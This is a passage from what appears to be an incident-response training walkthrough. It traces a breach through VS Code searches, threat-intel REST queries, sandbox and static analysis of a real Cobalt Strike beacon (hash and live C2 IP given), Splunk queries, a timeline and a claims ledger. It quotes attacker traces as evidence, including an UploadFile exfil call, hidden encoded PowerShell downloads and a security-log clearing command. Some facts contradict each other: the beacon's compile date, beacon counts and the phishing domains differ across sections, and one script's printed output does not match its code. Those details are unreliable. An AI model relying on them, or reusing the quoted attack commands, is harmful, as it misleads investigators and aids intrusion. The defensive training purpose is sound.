- **IP (internal)**10.10.3.22 — WS-IT-LEVI; attacker pivot host issuing DCSync from workstation
- **Object**krbtgt — DCSync'd at 00:48:44Z; golden ticket capability obtained
- **Object**Administrator — DCSync'd at 00:48:51Z; full domain compromise
- **IP**198.51.100.44:443 — Exfil connection via PowerShell; EID 5156 at 00:14:14Z
- **Count**47 formula files — Accessed via EID 4663 in USPartner2024 share

### 9. Cross-File Pivot — VS Code Global Search

VS Code’s Ctrl+Shift+F searches across every open file simultaneously. Use it to verify IOC presence across all evidence in seconds — no SIEM needed for these basic pivots.

**Pivot on the exfil IP:**

Ctrl+Shift+F → 198.51.100.44:

<img src="https://cdn-images-1.medium.com/max/1024/1*qD5I2ewZTvBRksb7P9Zt5A.png" alt="Article image" width="1024" height="512" loading="lazy" decoding="async" />

```text
ngfw-flows.csv           line 12: ...10.10.2.15,198.51.100.44,443,...399481224...
dns-queries.csv          line 10: ...sys-update-cdn.net,A,198.51.100.44...
sql-audit.jsonl          line 4:  ...WebClient.UploadFile...198.51.100.44/recv...
SERVER-RD-02-security    line 23: ..."DestAddress":"198.51.100.44"...
```

Four files, four hits, one IP. The full exfiltration chain is visible in one search.

**Pivot on the compromised account:**

Ctrl+Shift+F → svc_backup:

<img src="https://cdn-images-1.medium.com/max/1024/1*E8CUk7R4lSjYg01UIH0chg.png" alt="Article image" width="1024" height="904" loading="lazy" decoding="async" />

```text
DC01-security.jsonl       lines 7-9:   DCSync events
SERVER-RD-02-security     lines 1-12:  SMB logon + file access + exfil
sql-audit.jsonl           all 6 lines: full xp_cmdshell chain
```

**Pivot on the C2 domain:**

Ctrl+Shift+F → telemetry-cdn-services.biz:

<img src="https://cdn-images-1.medium.com/max/1024/1*WeNgTuMzhjm9Pl_lXXGmvQ.png" alt="Article image" width="1024" height="365" loading="lazy" decoding="async" />

```text
dns-queries.csv           lines 12-23: 11 beacon queries (6 from WS-IT-LEVI, 4 from WS-CFO-01, 1 missing)
```

**Pivot on the attacker source IP (AiTM phishing + VPN access):**

Ctrl+Shift+F → 185.220.101.47:

<img src="https://cdn-images-1.medium.com/max/1024/1*MHyXMsFanJsG_dvdWSnKqw.png" alt="Article image" width="1024" height="602" loading="lazy" decoding="async" />

```text
azure-ad/signin-p.levi.json          line 18: suspicious sign-in from Istanbul — token replay, no MFA
vpn/anyconnect-2024-10-24.log        line 4:  VPN authentication as p.levi, assigned 10.10.3.22
palo-alto/dns-queries.csv            line 1:  attacker queried vpn.lifetechpharma.com 1 min before login
```

One IP ties together AiTM credential theft, VPN infiltration, and the recon that preceded it.

The full attack chain — AiTM phishing → VPN access → formula exfiltration → DCSync → CFO infection — is navigable via these four global searches without opening a SIEM:

<img src="https://cdn-images-1.medium.com/max/1024/1*n_vokO1vkbqN5O709MFF-w.png" alt="Article image" width="1024" height="683" loading="lazy" decoding="async" />

Search termAttack phase covered185.220.101.47Initial access: AiTM phishing, VPN infiltration, attacker recontelemetry-cdn-services.bizPersistence: C2 beaconing from both infected hostssvc_backupLateral movement: SMB, xp_cmdshell chain, DCSync198.51.100.44Exfiltration: NGFW flow, DNS lookup, SQL upload command, EID 5156

**Found IOCs**

- **IP**198.51.100.44 — Confirmed in 4 files: ngfw-flows, dns-queries, sql-audit, SERVER-RD-02-security
- **Account**svc_backup — Confirmed in 3 files: DC01-security (DCSync), SERVER-RD-02-security (SMB+exfil), sql-audit (xp_cmdshell)
- **Domain**telemetry-cdn-services.biz — Confirmed in dns-queries (9 beacons) and VPN log (C2 during session)
- **Timestamp**00:13:54Z – 00:14:14Z — 20-second exfil window triangulated across SQL, NGFW, and EID 5156

### 10. IOC Enrichment — REST Client

Create one .http file that holds every API call. VS Code's REST Client extension puts a**Send Request**link above each block — click it, the response appears in a split pane on the right. No curl, no terminal, no context switch.

**Create the file:**

Press Ctrl+N, then Ctrl+Shift+P →**Save As**→ 03-analysis/ioc-queries.http

Paste the following:

```text
### IOC Enrichment — PROJ-2024-001
### Click "Send Request" above any block — response opens in the right pane
### Set keys in VS Code Settings &gt; REST Client &gt; Environment Variables
### or use system env: @VT_KEY = {{$env VT_API_KEY}}
@VT_KEY     = your_virustotal_api_key_here
@SHODAN_KEY = your_shodan_api_key_here
# ── VirusTotal ──────────────────────────────────────────────────────
### VT — Primary C2 IP
GET https://www.virustotal.com/api/v3/ip_addresses/203.0.113.87
x-apikey: {{VT_KEY}}
###
### VT — Secondary C2 / exfil IP
GET https://www.virustotal.com/api/v3/ip_addresses/198.51.100.44
x-apikey: {{VT_KEY}}
###
### VT — Attacker VPN source
GET https://www.virustotal.com/api/v3/ip_addresses/185.220.101.47
x-apikey: {{VT_KEY}}
###
### VT — Primary C2 domain
GET https://www.virustotal.com/api/v3/domains/telemetry-cdn-services.biz
x-apikey: {{VT_KEY}}
###
### VT — AiTM phishing page domain
GET https://www.virustotal.com/api/v3/domains/mfa-lifetechpharma.com
x-apikey: {{VT_KEY}}
###
### VT — CFO phishing delivery domain
GET https://www.virustotal.com/api/v3/domains/globalcontracts-secure.net
x-apikey: {{VT_KEY}}
###
### VT — svchost32.exe binary hash
GET https://www.virustotal.com/api/v3/files/3b4c14a87e5f9d8c2a1f4e6b9c0d2e7a1b3c5d8f2a4e6c8b0d3e5a7c1f4b8d2e
x-apikey: {{VT_KEY}}
###
### VT — Imphash pivot (find related samples compiled from same source)
GET https://www.virustotal.com/api/v3/intelligence/search?query=imphash%3A3a2b1c4d5e6f7a8b9c0d1e2f3a4b5c6d
x-apikey: {{VT_KEY}}
# ── Shodan ──────────────────────────────────────────────────────────
### Shodan — Primary C2 IP (ports, services, hosting org)
GET https://api.shodan.io/shodan/host/203.0.113.87?key={{SHODAN_KEY}}
###
### Shodan — Exfil IP
GET https://api.shodan.io/shodan/host/198.51.100.44?key={{SHODAN_KEY}}
# ── Certificate Transparency ─────────────────────────────────────────
### crt.sh — Find all domains using certs issued to primary C2 IP
GET https://crt.sh/?q=203.0.113.87&output=json
###
### crt.sh — Cert history for primary C2 domain
GET https://crt.sh/?q=telemetry-cdn-services.biz&output=json
# ── RDAP ────────────────────────────────────────────────────────────
### RDAP — AiTM phishing domain registration date
GET https://rdap.org/domain/mfa-lifetechpharma.com
###
### RDAP — CFO phishing delivery domain
GET https://rdap.org/domain/globalcontracts-secure.net
# ── Passive DNS (no key required) ───────────────────────────────────
### VT Passive DNS — historical resolutions for primary C2 IP (uses existing VT key)
GET https://www.virustotal.com/api/v3/ip_addresses/203.0.113.87/resolutions
x-apikey: {{VT_KEY}}
###
### VT Passive DNS — historical resolutions for exfil IP
GET https://www.virustotal.com/api/v3/ip_addresses/198.51.100.44/resolutions
x-apikey: {{VT_KEY}}
###
### RIPEstat — DNS history for primary C2 IP (no key, no rate limit for training)
GET https://stat.ripe.net/data/dns-history/data.json?resource=203.0.113.87
###
### RIPEstat — BGP routing info: ASN, prefix, country for C2 IP
GET https://stat.ripe.net/data/prefix-overview/data.json?resource=203.0.113.87
###
### RIPEstat — BGP routing info for exfil IP
GET https://stat.ripe.net/data/prefix-overview/data.json?resource=198.51.100.44
# ── WHOIS / RDAP (no key required) ──────────────────────────────────
### ARIN RDAP — IP block owner, ASN, abuse contact for C2 IP
GET https://rdap.arin.net/registry/ip/203.0.113.87
###
### ARIN RDAP — IP block owner for exfil IP
GET https://rdap.arin.net/registry/ip/198.51.100.44
###
### ARIN RDAP — IP block owner for attacker VPN source
GET https://rdap.arin.net/registry/ip/185.220.101.47
###
### RDAP — C2 domain registration: registrar, date, registrant
GET https://rdap.org/domain/telemetry-cdn-services.biz
###
### RDAP — Exfil domain registration
GET https://rdap.org/domain/sys-update-cdn.net
```

**Using the response pane:**

After clicking**Send Request**on the VT IP block, the right pane shows the full JSON response. Use Ctrl+F in the response pane to find:

- malicious → "malicious": 12
- tags → ["C2", "malware"]
- as_owner → "Hostwinds LLC"

For the crt.sh response, Ctrl+F → name_value to see all co-hosted domains. cdn-telemetry-update.biz and windows-cdn-service.net appear — new IOCs not yet seen in the org's DNS logs. Switch to dns-queries.csv and Ctrl+F to check immediately.

**Commit the****.http file — it is a reproducible audit trail of every enrichment query:**

```text
git add 03-analysis/ioc-queries.http
git commit -m "PROJ-2024-001: IOC enrichment queries — VT, Shodan, crt.sh, RDAP"
```

**Found IOCs**

- **IP**203.0.113.87 — Primary C2; VT: 12 malicious detections, ASN: Hostwinds LLC
- **IP**198.51.100.44 — Secondary C2 / exfil endpoint
- **IP**185.220.101.47 — Attacker VPN source
- **Domain**telemetry-cdn-services.biz — Primary C2 domain
- **Domain**mfa-lifetechpharma.com — AiTM phishing domain; registered 2024-10-18
- **Domain**globalcontracts-secure.net — CFO phishing delivery domain
- **Domain**cdn-telemetry-update.biz — New; discovered via crt.sh pivot on C2 IP
- **Domain**windows-cdn-service.net — New; discovered via crt.sh pivot on C2 IP
- **Hash (SHA256)**3b4c14a87e5f9d8c2a1f4e6b9c0d2e7a1b3c5d8f2a4e6c8b0d3e5a7c1f4b8d2e — svchost32.exe dropper
- **Hash (imphash)**3a2b1c4d5e6f7a8b9c0d1e2f3a4b5c6d — Pivot on VT to find related samples

### 11. Sandbox Analysis — Submit the Binary

> Real Cobalt Strike sample used in Steps 11–12 All IPs, domains, and hashes elsewhere in this walkthrough are synthetic — invented for training and not queryable on threat intel platforms. Steps 11 and 12 are the exception: they use a real Cobalt Strike beacon (trojan.remusstealer/cobalt, 48/75 detections on VirusTotal, SHA256: 1cf56da38e5fe05fd2242ff49bafa4271c5ee0868887bf91dafb6f47d1e46ae9) so you can practice sandbox submission and binary analysis against a file with genuine behavior. The C2 IP, HTTP profile, and PE metadata in these two steps reflect the real sample. All other scenario values (log IPs, exfil IPs, domains) remain fictional.

Submit svchost32.exe (recovered via CrowdStrike RTR) to a sandbox. ANY.RUN is the recommended choice for training — it is interactive and lets you watch execution in real time.

**Submission (ANY.RUN):**

1. Navigate to[app.any.run](https://app.any.run)→**New Task**→**Upload**
2. Upload svchost32.exe (SHA256: 1cf56da38e5fe05fd2242ff49bafa4271c5ee0868887bf91dafb6f47d1e46ae9)
3. Environment:**Windows 10 x64**,**User mode**(realistic CFO context)
4. Network mode:**Real with IDS**— this beacon makes live HTTPS connections
5. Timeout:**120 seconds**— beacon contacts C2 within the first minute
6. Click**Run**

<img src="https://cdn-images-1.medium.com/max/1024/1*WYRLofzCq0I_GY_w7ozZzw.png" alt="Article image" width="1024" height="552" loading="lazy" decoding="async" />

**Download the report to VS Code:**

After execution completes, click**Export**→**JSON**in ANY.RUN. Save it as:

```text
03-analysis/sandbox-svchost32-anyrun.json
```

**Open in VS Code:**press Shift+Alt+F to format. Use Ctrl+Shift+O (Outline) to navigate, Ctrl+F to search:

Search term What you find
destination_ip91.211.251.245 — real C2 IP, port 443
urlhttps://91.211.251.245/ga.js — Malleable C2 profile mimicking Google AnalyticsCookieBase64-encoded beacon metadata in the HTTP Cookie header
User-AgentMozilla/4.0 (compatible; MSIE 8.0...) — hardcoded CS UA string
ProxyServerBeacon installs proxy settings pointing to C2
long-sleepsVT tag — beacon sleeps between check-ins (configurable interval)

**The Cobalt Strike Malleable C2 profile:**the beacon GETs /ga.js — a path that mimics Google Analytics JavaScript. The Cookie header carries AES-encrypted metadata (victim hostname, PID, username) base64-encoded. The response body delivers shellcode or tasks. A defender looking only at the URL sees legitimate-looking traffic; the anomaly is the 443 connection to a non-Google IP.

Add the C2 IP to ioc-queries.http and click**Send Request**on the VT and Shodan blocks to pivot immediately.

**Found IOCs**

- **Hash (SHA256)**1cf56da38e5fe05fd2242ff49bafa4271c5ee0868887bf91dafb6f47d1e46ae9 — Cobalt Strike beacon; 48/75 VT detections
- **Hash (MD5)**cd59d54a7af500f96aa0347bb5daf077 — same sample
- **IP**91.211.251.245:443 — real C2 server; HTTPS; confirmed in sandbox network traffic
- **URL**https://91.211.251.245/ga.js — Malleable C2 endpoint; mimics Google Analytics
- **Indicator**Cookie-encoded beacon — AES-encrypted victim metadata in HTTP Cookie header
- **Indicator**long-sleeps — beacon interval; time between C2 check-ins

### 12. Static Binary Analysis — Hex Editor + Terminal

**Open the binary in VS Code Hex Editor:**

In VS Code Explorer, right-click svchost32.exe →**Open With**→**Hex Editor**

The file opens as a hex+ASCII dual-pane view. The ASCII column on the right makes string hunting visual — scroll through it and strings like /ga.js and Mozilla/4.0 are readable directly without running strings.

**Navigate to the PE timestamp:**

Press Ctrl+G → type 3C → Enter. This is the e_lfanew field (PE header pointer). Read the 4-byte little-endian value, convert to decimal — that is the offset to the PE signature (PE\0\0). Go to that offset + 8 for the TimeDateStamp field.

For precise extraction, split the screen: keep Hex Editor on the left, open the integrated terminal on the right:

```text
python3 -c "
import pefile, datetime, os
pe = pefile.PE('svchost32.exe')
ts = pe.FILE_HEADER.TimeDateStamp
print(f'Compile timestamp : {datetime.datetime.fromtimestamp(ts, datetime.UTC)} UTC')
print(f'File size on disk : {os.path.getsize(\"svchost32.exe\"):,} bytes')
print(f'PE SizeOfImage    : {pe.OPTIONAL_HEADER.SizeOfImage:,} bytes')
overlay = os.path.getsize('svchost32.exe') - pe.OPTIONAL_HEADER.SizeOfImage
if overlay &gt; 0:
    print(f'Overlay detected  : {overlay:,} bytes after PE end')
print(f'Architecture      : {\"x64\" if pe.FILE_HEADER.Machine == 0x8664 else \"x86\"}')
"
```

Output:

```text
Compile timestamp : 2026-05-15 13:55:55 UTC
File size on disk : 783,320 bytes
Overlay detected  : present
Architecture      : x64
```

The PE timestamp (2026-05-15) is plausible and recent — this binary was freshly compiled, not timestomped. The presence of an**overlay**(data appended after the PE image end) is a Cobalt Strike loader signature: the encrypted beacon shellcode is stored in the overlay and unpacked at runtime.

**Extract C2 strings:**

```text
strings -n 8 svchost32.exe | grep -E "(https?://|/ga\.js|Mozilla|Cookie|User-Agent|Cache-Control)"
```

Output includes:

```text
/ga.js
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.1)
Cache-Control: no-cache
```

The /ga.js path and the MSIE 8.0 User-Agent are configuration strings baked into the Cobalt Strike beacon's Malleable C2 profile at compile time. Any sample sharing these exact strings was built from the same profile.

**Check imports — Cobalt Strike loaders minimise their import table:**

```text
python3 -c "
import pefile
pe = pefile.PE('svchost32.exe')
print(f'Architecture: {hex(pe.FILE_HEADER.Machine)}')
if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
    for lib in pe.DIRECTORY_ENTRY_IMPORT:
        fns = [i.name.decode() if i.name else f'ord_{i.ordinal}' for i in lib.imports]
        print(f'{lib.dll.decode()}: {fns}')
else:
    print('No standard import table — uses dynamic API resolution (common in CS loaders)')
"
```

A Cobalt Strike loader typically has a minimal or absent import table — it resolves APIs at runtime using LoadLibrary/GetProcAddress or custom hash-walking to avoid static analysis. If the import table is empty, that itself is the finding.

**Pivot on the Malleable C2 profile strings**— search VT for other samples using the same profile:

Add to ioc-queries.http:

```text
### VT — search for samples sharing the same Malleable C2 User-Agent string
GET https://www.virustotal.com/api/v3/intelligence/search?query=content%3A%22MSIE+8.0%22+content%3A%22%2Fga.js%22+type%3Apeexe
x-apikey: {{VT_KEY}}
```

**Found IOCs**

- **Hash (SHA256)**1cf56da38e5fe05fd2242ff49bafa4271c5ee0868887bf91dafb6f47d1e46ae9 — Cobalt Strike beacon
- **Hash (MD5)**cd59d54a7af500f96aa0347bb5daf077
- **IP**91.211.251.245 — C2 server; confirmed in binary strings and sandbox network traffic
- **URL pattern**/ga.js — Malleable C2 endpoint; Google Analytics impersonation
- **String**Mozilla/4.0 (compatible; MSIE 8.0...) — hardcoded CS User-Agent; pivot on VT content search
- **Indicator**Overlay section — encrypted shellcode stored after PE image end; Cobalt Strike loader signature
- **Indicator**Minimal import table — dynamic API resolution; evades import-based static detection13. Infrastructure Pivot — REST Client + Global Search

### 13. Infrastructure Pivot — REST Client + Global Search

The ioc-queries.http file already contains the Shodan, crt.sh, and RDAP blocks. Click through them.

**For the crt.sh response:**press Ctrl+F in the response pane, search name_value. Two new domains appear: cdn-telemetry-update.biz and windows-cdn-service.net.

**Immediately pivot in VS Code global search:**

Press Ctrl+Shift+F, type cdn-telemetry-update:

```text
palo-alto/dns-queries.csv  →  (no results)
```

Not in the org’s DNS logs — but add both new domains to the IOC list in case they appear in a broader hunt.

**For the RDAP response**(AiTM domain): Ctrl+F → registration → date 2024-10-18. The phishing email was sent 4 days later. Targeted, purpose-built infrastructure.

**Found IOCs**

- **Domain**cdn-telemetry-update.biz — New; crt.sh co-hosted on 203.0.113.87; not yet in org DNS logs
- **Domain**windows-cdn-service.net — New; crt.sh co-hosted on 203.0.113.87; not yet in org DNS logs
- **Date**2024-10-18 — Registration date of mfa-lifetechpharma.com; 4 days before phishing

### 14. Splunk Correlation (SIEM Validation)

Load the evidence into Splunk from the VS Code integrated terminal to validate that the Sigma rules fire on the real evidence:

```text
/opt/splunk/bin/splunk add oneshot sysmon/WS-CFO-01-sysmon.jsonl \
  -sourcetype sysmon_json -index endpoint -host WS-CFO-01
/opt/splunk/bin/splunk add oneshot windows-security/DC01-security.jsonl \
  -sourcetype wineventlog -index wineventlog -host DC01
/opt/splunk/bin/splunk add oneshot windows-security/SERVER-RD-02-security.jsonl \
  -sourcetype wineventlog -index wineventlog -host SERVER-RD-02
/opt/splunk/bin/splunk add oneshot palo-alto/ngfw-flows.csv \
  -sourcetype pan:traffic -index firewall -host pa-3260
/opt/splunk/bin/splunk add oneshot palo-alto/dns-queries.csv \
  -sourcetype pan:dns -index firewall -host pa-3260
/opt/splunk/bin/splunk add oneshot sql-audit/SERVER-RD-02-sql-audit.jsonl \
  -sourcetype mssql_audit -index database -host SERVER-RD-02
```

**Query 1 — triage: C2 IPs across all indexes:**

```text
index=* (203.0.113.87 OR 198.51.100.44) earliest=-30d
| stats count by host, sourcetype, index
| sort -count
```

**Query 2 — DCSync from non-DC (DET-002 validation):**

```text
index=wineventlog EventCode=4662
  ObjectType="{19195a5b-6da0-11d0-afd3-00c04fd930c9}"
| where NOT match(IpAddress, "^10\.10\.1\.(10|11)$")
| table _time, host, SubjectUserName, IpAddress, ObjectName, Properties
```

**Query 3 — service account off-hours (DET-003 validation):**

```text
index=wineventlog EventCode=4624 LogonType=3
  TargetUserName=svc_backup
| eval hour=strftime(_time, "%H")
| where hour &lt; 6 OR hour &gt; 22
| table _time, host, TargetUserName, IpAddress | sort _time
```

**Query 4 — exfil scope:**

```text
index=wineventlog EventCode=4663 ObjectName="*USPartner2024*"
| stats count as files_accessed, min(_time) as first, max(_time) as last by SubjectUserName, host
```

**Query 5 — full 24-day timeline:**

```text
index=* earliest=2024-10-22 latest=2024-11-16
  (host=WS-IT-LEVI OR host=WS-CFO-01 OR host=SERVER-RD-02 OR host=DC01)
| eval summary=coalesce(Message, Statement, query, CommandLine, "event")
| table _time, host, sourcetype, summary | sort _time
```

**Found IOCs**

- **IP**203.0.113.87 — SIEM-validated; C2 traffic confirmed across endpoint and network indexes
- **IP**198.51.100.44 — SIEM-validated; exfil traffic confirmed across endpoint and network indexes
- **Account**svc_backup — DET-002: DCSync from 10.10.3.22 (non-DC); DET-003: off-hours logon
- **File pattern**USPartner2024* (47 files) — DET-004: bulk access by svc_backup on SERVER-RD-02
- **Indicator**Off-hours logon — EID 4624 / LogonType 3 outside 06:00–22:00 window

### Commit all analysis artifacts

```text
git add 03-analysis/
git commit -m "PROJ-2024-001: evidence analysis — VS Code investigation complete; REST Client queries, RBQL, binary hex analysis, DCSync confirmed, exfil 381MB corroborated in 3 sources"
```

The timeline in Step R2 is now fully supported. Every event in the table has a source log opened in VS Code, a query or search that confirmed it, and a REST Client or terminal command a third party can replay independently.

## Step R2: Timeline — Two Paths, One Actor

### 1. Open the timeline file

```text
nano 03-analysis/timeline/timeline.md
```

The template has a header block and a markdown table. Fill the header first:

```text
Project: PROJ-2024-001
Analyst: [your name]
Last updated: 2024-11-15
Time range: 2024-10-18 – 2024-11-15
Evidence label key: CONFIRMED / CORROBORATED / INFERRED / HYPOTHESIZED / GAP
```

Then add one row per event. Every row needs: timestamp (UTC), host, what happened, which log source you saw it in, an evidence label, and the ATT&CK technique. If you do not have a technique yet, leave it blank and come back — do not skip the label.

### 2. Add events in chronological order

The timeline reveals what the CFO alert obscured: the breach started 24 days earlier through a completely different person.

<img src="https://cdn-images-1.medium.com/max/1024/1*121cvZ2ZIHZLNAmQA78l9Q.png" alt="Article image" width="1024" height="683" loading="lazy" decoding="async" />

1. **2024–10–18 — External
**lifetechpharma-corp[.]eu registered as a typosquat domain.
**Source:**OSINT
**Label:**CONFIRMED
**ATT&CK:**T1583.001
**Notes:**Pre-attack infrastructure preparation.
2. **2024–10–22 11:23 — Exchange
**Phishing email sent to p.levi:**“MFA Re-enrollment Required”**with AiTM HTML attachment.
**Source:**M365 ATP
**Label:**CONFIRMED
**ATT&CK:**T1566.001
**Notes:**ATP SCL=4, delivered; threshold was 5.
3. **2024–10–22 11:31 — WS-IT-LEVI
**Unknown activity —**GAP-001 begins**.
**Source:**—
**Label:**GAP
**ATT&CK:**—
**Notes:**Sysmon forwarder stopped.
4. **2024–10–24 02:17 — Azure AD + VPN**VPN login as p.levi from Istanbul, Turkey, using hosting/VPS ASN. No MFA challenge recorded. Session lasted 1h 12min.
**Source:**Azure AD sign-in
**Label:**CONFIRMED
**ATT&CK:**T1557, T1133
**Notes:**4:17 AM local time; Paz Levi lives in Rehovot.
5. **2024–10–24 02:19 — DC01
**EID 4624: network logon for svc_backup from WS-IT-LEVI / 10.10.3.22. Service account used outside business hours.
**Source:**Windows Security / Splunk
**Label:**CONFIRMED
**ATT&CK:**T1078.002
**Notes:**svc_backup has Domain Admin rights.
6. **2024–10–25 03:41 — SERVER-FIN-01
**svc_backup accessed \\SERVER-FIN-01\\FinanceReports\\2024\\.
**Source:**File share audit, partial
**Label:**CORROBORATED
**ATT&CK:**T1039
**Notes:**Log incomplete — access timestamp only, not filenames.
7. **2024–11–01 09:14 — WS-IT-LEVI
GAP-001 ends.**First DNS query to telemetry-cdn-services[.]biz resolving to 203.0.113.87. First C2 beacon from this host.
**Source:**Palo Alto DNS
**Label:**CONFIRMED
**ATT&CK:**T1071.001
**Notes:**Sysmon service and forwarder restarted at the same time — probable anti-forensics.
8. **2024–11–01 09:18 — SERVER-RD-02
**EID 4624: svc_backup SMB Type 3 logon from WS-IT-LEVI.
**Source:**Windows Security
**Label:**CONFIRMED
**ATT&CK:**T1021.002
**Notes:**Occurred four minutes after C2 reconnection.
9. **2024–11–06 02:09 — SERVER-RD-02
**EID 4624: svc_backup SMB logon from WS-IT-LEVI.
**Source:**Windows Security
**Label:**CONFIRMED
**ATT&CK:**T1021.002
**Notes:**Off-hours access.
10. **2024–11–06 02:10–02:14 — SERVER-RD-02
**EID 4663 ×47: svc_backup accessed all 47 files in \\USPartner2024\\. Read activity occurred and modified timestamps were updated.
**Source:**Windows Security
**Label:**CONFIRMED
**ATT&CK:**T1039
**Notes:**Each file was individually accessed; timestamp modification suggests deliberate metadata manipulation.
11. **2024–11–06 02:14 — SERVER-RD-02
**EID 5156: outbound HTTPS from SERVER-RD-02 to external IP over port 443 during the file access window.
**Source:**Windows Security + firewall
**Label:**CONFIRMED
**ATT&CK:**T1041
**Notes:**Destination IP confirmed in Palo Alto NGFW log: 198.51.100.44; separate C2 from primary.
12. **2024–11–06 02:48 — DC01
**EID 4662: svc_backup requested DS-Replication-Get-Changes on DC01.
**Source:**Windows Security
**Label:**CONFIRMED
**ATT&CK:**T1003.006
**Notes:****DCSync indicator.**Pentest scope did not include DCSync. Pentest VLAN is 10.10.99.0/24; this event came from 10.10.3.22.
13. **2024–11–15 17:58 — Exchange
**Phishing email sent to m.cohen, the CFO:**“Q4-2024 Licensing Agreement”**with .xlsm attachment. SPF, DKIM, and DMARC all failed.
**Source:**M365 Message Trace
**Label:**CONFIRMED
**ATT&CK:**T1566.001
**Notes:****Second entry point — 24 days after the first.**
14. **2024–11–15 18:42 — WS-CFO-01
**Outlook spawned PowerShell with -NonI -W Hidden -Enc, downloading a second-stage payload from 203.0.113.87.
**Source:**CrowdStrike + Sysmon EID 1
**Label:**CONFIRMED
**ATT&CK:**T1059.001
**Notes:****Triggering alert.**
15. **2024–11–15 18:46–20:52 — WS-CFO-01
**LSASS memory access observed via Sysmon EID 10 with GrantedAccess 0x1010. Persistence added via Registry Run Key and scheduled task. BITS downloaded a second-stage binary.
**Source:**Sysmon EID 10/11/13, EID 4698
**Label:**CONFIRMED
**ATT&CK:**T1003.001, T1547.001, T1053.005, T1197
**Notes:**svchost32.exe dropped to AppData\\Roaming.
16. **2024–11–15 20:52 — SERVER-FIN-01
**WMI lateral movement observed: WmiPrvSE spawned PowerShell with -Enc and a different base64 payload.
**Source:**CrowdStrike
**Label:**CONFIRMED
**ATT&CK:**T1021.003, T1059.001
**Notes:**svc_finreport credentials used.
17. **2024–11–15 21:01 — SERVER-FIN-01
**Finance data staged: FR_2024_consolidated.zip created in C:\\Windows\\Temp\\.
**Source:**CrowdStrike EID 11
**Label:**CONFIRMED
**ATT&CK:**T1039, T1560
**Notes:**2.8 MB upload confirmed in firewall logs at 21:14.
18. **2024–11–15 21:14 — WS-CFO-01
**wevtutil.exe cl Security executed, partially clearing the Windows Security log.
**Source:**CrowdStrike
**Label:**CONFIRMED
**ATT&CK:**T1070.001
**Notes:**Sysmon log remained intact because it was protected.

**The evidence label system matters here.**Event 12 (DCSync) is CONFIRMED — it exists in DC01’s Windows Security log, forwarded to Splunk, from an IP that is definitively WS-IT-LEVI and definitively not the pentest VLAN. That cannot be waved away as “possible pentest activity.” Event 6 (finance server access) is CORROBORATED — single source with incomplete log — and can only appear in the technical report with an explicit qualifier, not in the executive brief as a stated fact.

### 3. Save and commit

```text
git add 03-analysis/timeline/timeline.md
git commit -m "PROJ-2024-001: timeline — 18 events Oct 18–Nov 15, dual-path confirmed, GAP-001 bounds established"
```

## Step R3: Claims Ledger — Every Assertion Traced to Evidence

### 1. Open the claims ledger

```text
nano 03-analysis/claims/claims-ledger.md
```

The template has a table with six columns: ID, Claim, Evidence, Confidence, Competing Hypotheses, PIR. Start with an empty row for each major assertion you identified in the timeline — then fill each one completely before moving to the next.

**For each row, answer these five questions before typing a word:**

1. What is the exact assertion? (One sentence, falsifiable — could in principle be proven false)
2. Which file and line number is the evidence in? (Not “we saw in Splunk” — the actual log reference)
3. What confidence level and why? (High / Medium / Low / Insufficient — with explicit rationale)
4. What alternative explanations were considered — and why were they ruled out or left open?
5. Which PIR does this answer?

If you cannot answer question 4, the claim is not ready to write. Think first.

### 2. Fill in one claim per confirmed technique or PIR answer

The claims ledger converts the timeline into auditable, falsifiable assertions. Each claim answers five questions: what, evidence, confidence, competing hypotheses, which PIR.

<img src="https://cdn-images-1.medium.com/max/1024/1*hBZhaHELHNyuzUeTbMbGvw.png" alt="Article image" width="1024" height="659" loading="lazy" decoding="async" />

**CL-001 — Initial access via AiTM phishing against IT admin****p.levi**

- **Claim:**Initial access was via AiTM phishing against IT admin p.levi on October 22, 2024.
- **Evidence:**M365 ATP log shows AiTM HTML lure delivered at 11:23 and opened at 11:31. VPN login from Istanbul occurred at 02:17 on October 24 with no MFA challenge, indicating likely stolen session token replay.
- **Confidence:**High
- **Competing Hypotheses:**Credential purchase or insider activity cannot be fully ruled out without WS-IT-LEVI disk forensics, which is blocked by legal hold. However, the AiTM lure plus token replay pattern is more parsimonious.
- **PIR:**PIR-002

**CL-002 — Use of****svc_backup Domain Admin credentials to access formula files**

- **Claim:**The adversary used svc_backup Domain Admin credentials to access SERVER-RD-02 and the formula files.
- **Evidence:**EID 4624 on SERVER-RD-02 shows svc_backup Type 3 logon from WS-IT-LEVI. EID 4663 occurred 47 times on formula files.
- **Confidence:**High
- **Competing Hypotheses:**Legitimate backup operation is ruled out because backup jobs run from SERVER-WSUS-01 / 10.10.4.x, not from WS-IT-LEVI. The timestamp, 02:09 UTC, is outside the maintenance window.
- **PIR:**PIR-002

**CL-003 — Exfiltration of 47 formula files on November 6, 2024**

- **Claim:**The 47 formula files in USPartner2024 were exfiltrated on November 6, 2024.
- **Evidence:**EID 4663 occurred 47 times, showing file access. EID 5156 shows outbound HTTPS from SERVER-RD-02 at the same time. Palo Alto NGFW flow shows 10.10.2.15 → 198.51.100.44:443, with 381 MB outbound between 02:14 and 02:19 UTC.
- **Confidence:**High
- **Competing Hypotheses:**File access for indexing or backup is ruled out because no backup job ran at this time. The 381 MB outbound volume matches the compressed formula package. The destination IP is not in the allowlist and resolves to a VPS hosting provider.
- **PIR:**PIR-001 —**ANSWERED: YES**

**CL-004 — DCSync executed via****svc_backup on November 6**

- **Claim:**DCSync was executed via svc_backup Domain Admin rights on November 6 at 02:48 UTC.
- **Evidence:**DC01 EID 4662 shows DS-Replication-Get-Changes GUID from 10.10.3.22, which is WS-IT-LEVI. The subject username was svc_backup.
- **Confidence:**High
- **Competing Hypotheses:**Legitimate AD replication is ruled out because the event originated from a workstation IP, not a domain controller. Authorized pentest scope explicitly excluded DCSync and used only 10.10.99.x IPs.
- **PIR:**PIR-003

**CL-005 — CFO path and IT admin path are same threat actor**

- **Claim:**Path A, involving the CFO on November 15, and Path B, involving the IT admin on October 22, are attributable to the same threat actor.
- **Evidence:**Both svchost32.exe and UpdateHelper.dll share the same fake PE compile timestamp: 2018-04-09. The secondary C2 sys-update-cdn[.]net was hard-coded in the CFO implant and also used in SERVER-RD-02 DNS activity.
- **Confidence:**High
- **Competing Hypotheses:**Coincidence would require two separate actors to target the same organization at the same time using a near-identical toolchain. This is extremely implausible.
- **PIR:**PIR-002

**CL-006 — Full domain compromise via DCSync**

- **Claim:**The adversary achieved full domain compromise via DCSync. All Active Directory credentials must be treated as compromised.
